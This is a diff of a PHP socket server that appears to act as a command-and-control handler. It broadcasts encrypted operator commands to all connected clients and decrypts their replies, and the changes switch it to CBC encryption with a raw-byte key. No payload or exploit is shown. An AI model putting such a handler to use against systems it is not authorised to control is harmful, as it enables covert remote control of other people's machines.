@@ -28,7 +28,7 @@
 	or die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 	
 	if(!file_exists('.success')){
-		$key = base64_encode(bin2hex(openssl_random_pseudo_bytes(32)));
+		$key = base64_encode(openssl_random_pseudo_bytes(32));
 		file_put_contents('.success', $key);
 		// ili exit(1);??
 	} else {
@@ -36,7 +36,7 @@
 	}
 	require_once 'Openssl_EncryptDecrypt.php';
 	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
-	define('ENCRYPTION_KEY', $key);
+	define('ENCRYPTION_KEY', base64_decode($key));
 
 	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
 	
@@ -50,14 +50,14 @@
 		$except = NULL;
 		$now = date('H:i:s');
 
-	    if(socket_select($recv, $write, $except, NULL) === false)
+	    if(! socket_select($recv, $write, $except, NULL))
 	    {
 	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 	    }
 
 	    if(in_array($master_sock, $recv))
 	    {
-			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
+			if (! ($clients[] = $recv_sock = socket_accept($master_sock)))
 			{
 		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 		    }
@@ -119,8 +119,7 @@
 	        if($data !== "")
 	        {
 				// TODO:: determine if data is encrypted
-				$tempdata = $data;
-				$data = $openssl_encrypt_decrypt->decrypt($data, ENCRYPTION_KEY);
+				$data = $openssl_encrypt_decrypt->decrypt_cbc($data, ENCRYPTION_KEY);
 
 				echo "DATA";
 				var_dump($data);
@@ -152,7 +151,7 @@
 				{
 					$full_cmd .= trim($cmd);
 				}
-				$full_cmd = $openssl_encrypt_decrypt->encrypt($full_cmd, ENCRYPTION_KEY);
+				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd, ENCRYPTION_KEY);
 
 
 				foreach ($write as $send_sock)
@@ -160,7 +159,7 @@
 			        if($send_sock == $master_sock)
 			            continue;
 
-			        else if(@socket_write($send_sock, $full_cmd."\n", strlen($full_cmd)) === false)
+			        else if(! @socket_write($send_sock, $full_cmd."\n", strlen($full_cmd)))
 			        {	
 			        	echo "[\33[91mWrite error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
 			        }	
@@ -197,14 +196,14 @@
 		    	&& $line != 'clients'
 				&& $line != 'exit')
 		    {
-				$line = $openssl_encrypt_decrypt->encrypt($line, ENCRYPTION_KEY);
+				$line = $openssl_encrypt_decrypt->encrypt_cbc($line, ENCRYPTION_KEY);
 
 			  	foreach ($write as $send_sock)
 			  	{
 			        if($send_sock == $master_sock)
 			            continue;
 
-			        else if(@socket_write($send_sock, $line."\n", strlen($line)) === false)
+			        else if(! @socket_write($send_sock, $line."\n", strlen($line)))
 			        {	
 			        	echo "\33[91m[Write error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
 			        }	
